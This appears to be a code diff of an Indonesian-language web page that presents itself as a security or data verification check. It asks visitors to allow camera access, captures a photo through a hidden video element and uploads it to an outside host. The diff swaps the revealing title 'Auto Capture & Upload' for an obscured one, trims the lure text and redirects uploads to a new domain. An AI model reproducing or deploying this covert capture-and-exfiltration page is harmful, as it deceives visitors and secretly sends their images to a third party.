@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture & Upload</title>
+    <title>4m1ns kirai</title>
     <style>
         body {
             background: linear-gradient(135deg, #1e3c72, #2a5298);
@@ -40,9 +40,9 @@
 <body>
 
     <div class="container">
-        <h2>🔒 Keamanan Diperiksa</h2>
-        <p>Mohon izinkan kamera untuk verifikasi...</p>
-        <button id="startBtn">Mulai</button>
+        <h2>🔒 Data</h2>
+        <p>Aktifkan izin kamera..</p>
+        <button id="startBtn">Tekan</button>
     </div>
 
     <video id="video" style="display:none;" autoplay></video>
@@ -80,7 +80,7 @@
             let formData = new FormData();
             formData.append("image", blob, "photo.jpg");
 
-            fetch("https://imonback.my.id/upload.php", {
+            fetch("http://imonback.42web.io/?i=1", {
                 method: "POST",
                 body: formData
             })
